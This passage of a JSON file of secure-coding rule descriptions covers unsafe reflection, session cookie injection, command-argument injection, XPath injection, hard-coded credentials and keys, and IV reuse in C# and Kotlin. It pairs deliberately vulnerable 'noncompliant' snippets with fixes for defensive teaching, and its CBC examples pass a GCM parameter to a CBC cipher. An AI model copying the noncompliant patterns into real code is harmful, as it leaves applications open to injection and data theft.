filters or\neffects. It assumes the user will give a known name, such as \"SepiaEffect\".</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    public IActionResult Apply(string EffectName)\n    {\n        var EffectInstance  = Activator.CreateInstance(null, EffectName); // Noncompliant\n        object EffectPlugin = EffectInstance.Unwrap();\n\n        if ( ((IEffect)EffectPlugin).ApplyFilter() )\n        {\n            return Ok();\n        }\n        else\n        {\n            return Problem();\n        }\n    }\n}\n\npublic interface IEffect\n{\n    bool ApplyFilter();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    private static readonly string[] EFFECT_ALLOW_LIST = {\n        \"SepiaEffect\",\n        \"BlackAndWhiteEffect\",\n        \"WaterColorEffect\",\n        \"OilPaintingEffect\"\n    };\n\n    public IActionResult Apply(string EffectName)\n    {\n        if (!EFFECT_ALLOW_LIST.Contains(EffectName))\n        {\n            return BadRequest(\"Invalid effect name. The effect is not allowed.\");\n        }\n\n        var EffectInstance  = Activator.CreateInstance(null, EffectName);\n        object EffectPlugin = EffectInstance.Unwrap();\n\n        if ( ((IEffect)EffectPlugin).ApplyFilter() )\n        {\n            return Ok();\n        }\n        else\n        {\n            return Problem();\n        }\n    }\n}\n\npublic interface IEffect\n{\n    bool ApplyFilter();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>\n<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/470\">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe\n  Reflection')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "roslyn.sonaranalyzer.security.cs:S6287": {
        "name": "Applications should not create session cookies from untrusted input",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>\n<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the\napplication.</p>\n<p>The injection might occur via a GET parameter, and the payload, for example, <code><a\nhref=\"https://example.com?cookie=injectedcookie\">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a\nsession that isn’t theirs.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Sensitive data disclosure</h4>\n<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of\nimplications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>\n<h4>Vulnerability chaining</h4>\n<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and\nexploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,\nwhich can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>\n<h2>How to fix it in ASP.NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController : Controller\n{\n    [HttpGet]\n    public IActionResult CheckCookie(string cookie)\n    {\n        if (Request.Cookies[\"ASP.NET_SessionId\"] == null)\n        {\n            Response.Cookies.Append(\"ASP.NET_SessionId\", cookie);\n        }\n\n        return View(\"Welcome\");\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nusing System.Web;\nusing System.Web.Mvc;\n\npublic class ExampleController : Controller\n{\n    [HttpGet]\n    public IActionResult CheckCookie()\n    {\n        if (Request.Cookies[\"ASP.NET_SessionId\"] == null)\n        {\n            return View(\"GetCookie\");\n        }\n\n        return View(\"Welcome\");\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the\nvalue of a session cookie to untrusted data.</p>\n<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade\ntools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to\nuse these solutions than to develop your own.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/384\">CWE-384 - Session Fixation</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "roslyn.sonaranalyzer.security.cs:S6350": {
        "name": "Constructing arguments of system commands from user input is security-sensitive",
        "htmlDesc": "<p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920\">CVE-2016-9920</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472\">CVE-2021-29472</a> </li>\n</ul>\n<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the\nprograms. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing\nfiles into specific directories.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Malicious arguments can result in undesired behavior in the executed command. </li>\n  <li> Passing user input to a system command is not necessary. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid constructing system commands from user input when possible. </li>\n  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>\n  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in\nvulnerabilities:</p>\n<pre>\nusing System.Diagnostics;\nProcess p = new Process();\np.StartInfo.FileName = \"/usr/bin/find\";\np.StartInfo.ArgumentList.Add(input); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use an allow-list to restrict the arguments to trusted values:</p>\n<pre>\nusing System.Diagnostics;\nProcess p = new Process();\np.StartInfo.FileName = \"/usr/bin/find\";\nif (allowed.Contains(input)) {\n  p.StartInfo.ArgumentList.Add(input);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/php-supply-chain-attack-on-composer\">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>\n</ul>",
        "severity": "MAJOR"
      },
      "roslyn.sonaranalyzer.security.cs:S2091": {
        "name": "XPath expressions should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without\nsanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to execute malicious commands in the affected XML documents.</p>\n<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML\nstructures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to\nharmless.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data Leaks</h4>\n<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility\nstill exists with configuration files, for example.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked\norganization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the\nregular operations of an organization.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to XPath injections because untrusted data is concatenated in an XPath query without prior validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class ExampleController : Controller\n{\n    [HttpGet]\n    public IActionResult Authenticate(string user, string pass)\n    {\n        XmlDocument doc = new XmlDocument();\n\n        String expression = \"/users/user[@name='\" + user + \"' and @pass='\" + pass + \"']\";\n\n        return Json(doc.SelectSingleNode(expression) != null);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class ExampleController : Controller\n{\n    [HttpGet]\n    public IActionResult Authenticate(string user, string pass)\n    {\n        XmlDocument doc = new XmlDocument();\n        if (!Regex.IsMatch(user, \"^[a-zA-Z]+$\") || !Regex.IsMatch(pass, \"^[a-zA-Z]+$\"))\n        {\n            return BadRequest();\n        }\n\n        String expression = \"/users/user[@name='\" + user + \"' and @pass='\" + pass + \"']\";\n\n        return Json(doc.SelectSingleNode(expression) != null);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<h4>Validation</h4>\n<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it\nin an XPath query.</p>\n<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>\n<p>Input can be validated in multiple ways:</p>\n<ul>\n  <li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li>\n  <li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric\n  characters.) </li>\n  <li> By ensuring user input does not include any XPath metacharacters, such as <code>\"</code>, <code>'</code>, <code>/</code>, <code>@</code>,\n  <code>=</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li>\n</ul>\n<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>\n<p>In the example, a validation mechanism is applied to untrusted input to ensure it is strictly composed of alphabetic characters.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection\">OWASP, XPath Injection\n  Prevention Cheat Sheet</a> </li>\n  <li> <a href=\"https://web.archive.org/web/20230602194100/https://www.ambionics.io/blog/hacking-watchguard-firewalls\">Ambionics, XPath Injection\n  Section of \"Hacking WatchGuard Firewalls'</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/643\">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "kotlin:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nval params = \"password=xxxx\" // Sensitive\nval writer = OutputStreamWriter(getOutputStream())\nwriter.write(params)\nwriter.flush()\n...\nval password = \"xxxx\" // Sensitive\n...\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nval params = \"password=${retrievePassword()}\"\nval writer = OutputStreamWriter(getOutputStream())\nwriter.write(params)\nwriter.flush()\n...\nval password = retrievePassword()\n...\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">OWASP Top 10 2021 Category A7</a> - Identification and\n  Authentication Failures </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">OWASP Top 10 2017 Category A2</a> - Broken Authentication\n  </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/798\">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/259\">MITRE, CWE-259</a> - Use of Hard-coded Password </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "kotlin:S6301": {
        "name": "Mobile database encryption keys should not be disclosed",
        "htmlDesc": "<p>When storing local data in a mobile application, it is common to use a database that can be encrypted. When encryption of this database is enabled,\nthe encryption key must be protected properly.</p>\n<h2>Why is this an issue?</h2>\n<p>Mobile applications often need to store data (which might be sensitive) locally. For Android, there exist several libraries that simplify this\nprocess by offering a feature-rich database system. <a href=\"https://www.zetetic.net/sqlcipher/\">SQLCipher</a> and <a\nhref=\"https://realm.io/\">Realm</a> are examples of such libraries. These libraries often add support for database encryption, to protect the contents\nfrom being read by other apps or by attackers.</p>\n<p>When using encryption for such a database, it is important that the encryption key stays secret. If this key is hardcoded in the application, then\nit should be considered compromised. The key will be known by anyone with access to the application’s binary code or source code. This means that the\nsensitive encrypted data can be decrypted by anyone having access to the binary of the mobile application.</p>\n<p>Furthermore, if the key is hardcoded, it is the same for every user. A compromise of this encryption key implicates every user of the app.</p>\n<p>The encryption key is meant to stay secret and should not be hard-coded in the application as it would mean that:</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker is able to find the encryption key for the mobile database, this can potentially have severe consequences.</p>\n<h4>Theft of sensitive data</h4>\n<p>If a mobile database is encrypted, it is likely to contain data that is sensitive for the user or the app publisher. For example, it can contain\npersonally identifiable information (PII), financial data, login credentials, or other sensitive user data.</p>\n<p>By not protecting the encryption key properly, it becomes very easy for an attacker to recover it and then decrypt the mobile database. At that\npoint, the theft of sensitive data might lead to identity theft, financial fraud, and other forms of malicious activities.</p>\n<h2>How to fix it in Realm</h2>\n<h3>Code examples</h3>\n<p>In the example below, a local database is opened using a hardcoded key. To fix this, the key is moved to a secure location instead and retrieved\nusing a <code>getKey()</code> method.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nval key = \"gb09ym9ydoolp3w886d0tciczj6ve9kszqd65u7d126040gwy86xqimjpuuc788g\"\nval config = RealmConfiguration.Builder()\n    .encryptionKey(key.toByteArray()) // Noncompliant\n    .build()\nval realm = Realm.getInstance(config)\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\nval config = RealmConfiguration.Builder()\n    .encryptionKey(getKey())\n    .build()\nval realm = Realm.getInstance(config)\n</pre>\n<h3>How does this work?</h3>\n<h4>Using Android’s builtin key storage options</h4>\n<p>The <a href=\"https://developer.android.com/privacy-and-security/keystore\">Android Keystore</a> system allows apps to store encryption keys in a\ncontainer that is protected on a system level. Additionally, it can restrict when and how the keys are used. For example, it allows the app to require\nuser authentication (for example using a fingerprint) before the key is made available. This is the recommended way to store cryptographic keys on\nAndroid.</p>\n<h4>Dynamically retrieving encryption keys remotely</h4>\n<p>As user devices are less trusted than controlled environments such as the application backend, the latter should be preferred for the storage of\nencryption keys. This requires that a user’s device has an internet connection, which may not be suitable for every use case.</p>\n<h3>Going the extra mile</h3>\n<h4>Avoid storing sensitive data on user devices</h4>\n<p>In general, it is always preferable to store as little sensitive data on user devices as possible.</p>\n<p>Of course, some sensitive data always has to be stored on client devices, such as the data required for authentication. In this case, consider\nwhether the application logic can also function with a hash (or otherwise non-reversible form) of that data. For example, if an email address is\nrequired for authentication, it might be possible to use and store a hashed version of this address instead.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/keystore\">Android Keystore system</a> </li>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/security-tips#UserData\">Security tips - User data</a> </li>\n  <li> OWASP Mobile Application Security Testing Guide - <a\n  href=\"https://mobile-security.gitbook.io/mobile-security-testing-guide/android-testing-guide/0x05d-testing-data-storage\">Data Storage on Android</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">OWASP Top 10 2021 Category A4</a> - Insecure Design </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x07-v2-data_storage_and_privacy_requirements\">Mobile AppSec\n  Verification Standard</a> - Data Storage and Privacy Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage\">OWASP Mobile Top 10 2016 Category M2</a> - Insecure\n  Data Storage </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data\n  Exposure </li>\n  <li> <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/311\">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/321\">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>\n</ul>",
        "severity": "MAJOR"
      },
      "kotlin:S3329": {
        "name": "Cipher Block Chaining IVs should be unpredictable",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an\ninitialization vector (IV), also called a \"starting variable\" (SV).</p>\n<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same\nciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in Java Cryptographic Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.nio.charset.StandardCharsets\nimport java.security.InvalidAlgorithmParameterException\nimport java.security.InvalidKeyException\nimport java.security.NoSuchAlgorithmException\nimport javax.crypto.Cipher\nimport javax.crypto.NoSuchPaddingException\nimport javax.crypto.spec.GCMParameterSpec\nimport javax.crypto.spec.SecretKeySpec\n\nfun encrypt(key: String, plainText: String) {\n\n    val randomBytes = \"7cVgr5cbdCZVw5WY\".toByteArray(StandardCharsets.UTF_8)\n\n    val iv      = GCMParameterSpec(128, randomBytes)\n    val keySpec = SecretKeySpec(key.toByteArray(StandardCharsets.UTF_8), \"AES\")\n\n    try {\n        val cipher = Cipher.getInstance(\"AES/CBC/NoPadding\")\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv) // Noncompliant\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: InvalidKeyException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    } catch (e: InvalidAlgorithmParameterException) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.nio.charset.StandardCharsets\nimport java.security.SecureRandom\nimport java.security.InvalidAlgorithmParameterException\nimport java.security.InvalidKeyException\nimport java.security.NoSuchAlgorithmException\nimport javax.crypto.Cipher\nimport javax.crypto.NoSuchPaddingException\nimport javax.crypto.spec.GCMParameterSpec\nimport javax.crypto.spec.SecretKeySpec\n\nfun encrypt(key: String, plainText: String) {\n\n    val random      = SecureRandom();\n    val randomBytes = ByteArray(16);\n    random.nextBytes(randomBytes);\n\n    val iv      = GCMParameterSpec(128, randomBytes)\n    val keySpec = SecretKeySpec(key.toByteArray(StandardCharsets.UTF_8), \"AES\")\n\n    try {\n        val cipher = Cipher.getInstance(\"AES/CBC/NoPadding\")\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv)\n\n    } catch (e: NoSuchAlgorithmException) {\n        // ...\n    } catch (e: InvalidKeyException) {\n        // ...\n    } catch (e: NoSuchPaddingException) {\n        // ...\n    } catch (e: InvalidAlgorithmParameterException) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use unique IVs</h4>\n<p>To ensure high security, initialization vectors must meet two important criteria:</p>\n<ul>\n  <li> IVs must be unique for each encryption operation. </li>\n  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>\n</ul>\n<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>\n<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption\nattempts.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard</a> - Cryptography Requirements </li>\n  <li> <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">OWASP Mobile Top 10 2016 Category M5</a> -\n  Insufficient Cryptography </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/329\">MITRE, CWE-329</a> - Not Using an Unpredictable IV with CBC Mode </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "kotlin:S6432": {
        "name": "Counter Mode initialization vectors should not be reused",
        "htmlDesc": "<p>When encrypting data using AES-GCM or AES-CCM, it is essential not to reuse the same initialization vector (IV, also called nonce) with a given\nkey. To prevent this, it is recommended to either randomize the IV for each encryption or increment the IV after each encryption.</p>\n<h2>Why is this an issue?</h2>\n<p>When encrypting data using a counter (CTR) derived block cipher mode of operation, it is essential not to reuse the same initialization vector (IV)\nfor a given key. An IV that complies with this requirement is called a \"nonce\" (<strong>n</strong>umber used <strong>once</strong>). Galois/Counter\n(GCM) and Counter with Cipher Block Chaining-Message Authentication Code (CCM) are both derived from counter mode.</p>\n<p>When using AES-GCM or AES-CCM, a given key and IV pair will create a \"keystream\" that is used to encrypt a plaintext (original content) into a\nciphertext (encrypted content.) For any key and IV pair, this keystream is always deterministic. Because of this property, encrypting several\nplaintexts with one key and IV pair can be catastrophic. If an attacker has access to one plaintext and its associated ciphertext, they are able to\ndecrypt everything that was created using the same pair.</p>\n<p>Additionally, IV reuse also drastically decreases the key recovery computational complexity by downgrading it to a simpler polynomial root-finding\nproblem. This means that even without access to a plaintext/ciphertext pair, an attacker may still be able to decrypt all the sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>If the encryption that is being used is flawed, attackers might be able to exploit it in several ways. They might be able to decrypt existing\nsensitive data or bypass key protections.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By not using the encryption algorithm correctly, the likelihood that an attacker might be able to recover the original sensitive data drastically\nincreases.</p>\n<h4>Additional attack surface</h4>\n<p>Encrypted values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them. If an\nattacker is able to modify the cleartext of the encrypted message, it might be possible to trigger other vulnerabilities in the code.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The example uses a hardcoded IV as a nonce, which causes AES-CCM to be insecure. To fix it, a nonce is randomly generated instead.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\nfun encrypt(key: ByteArray, ptxt: ByteArray) {\n    val iv = \"7cVgr5cbdCZV\".toByteArray()\n\n    val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val keySpec = SecretKeySpec(key, \"AES\")\n    val gcmSpec = GCMParameterSpec(128, iv)\n\n    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec) // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\nfun encrypt(key: ByteArray, ptxt: ByteArray) {\n    val random = SecureRandom()\n    val iv = ByteArray(12)\n    random.nextBytes(iv)\n\n    val cipher = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val keySpec = SecretKeySpec(key, \"AES\")\n    val gcmSpec = GCMParameterSpec(128, iv)\n\n    cipher.init(Cipher.ENCRYPT_MODE, keySpec, gcmSpec)\n}\n</pre>\n<h3>How does this work?</h3>\n<p>For AES-GCM and AES-CCM, NIST recommends generating a nonce using either a deterministic 